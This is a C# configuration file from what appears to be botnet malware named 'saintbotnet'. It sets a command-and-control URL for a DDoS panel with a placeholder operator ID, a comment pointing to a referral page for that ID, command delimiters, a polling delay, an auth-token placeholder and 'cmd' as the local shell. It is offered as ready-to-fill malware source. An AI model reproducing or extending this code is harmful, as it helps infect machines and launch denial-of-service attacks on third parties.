﻿namespace saintbotnet
{
    class configs
    {
        public static string server { get; set; } = "https://api.masonov.space/ddos/?panel_uid=Your_ID";

        //Example https://api.masonov.space/ddos/?panel_uid= Your ID 
        //Check ID  https://grinotion.com/account/settings/referrals


        public static string spliter { get; set; } = "{ms}";

        public static string spliter2 { get; set; } = "{ms2}";

        public static int delay { get; set; } = 1000; // 1 сек
        
        public static string masonov_token { get; set; } = "auth_token";

        public static string local_cmd { get; set; } = "cmd";
    }
}
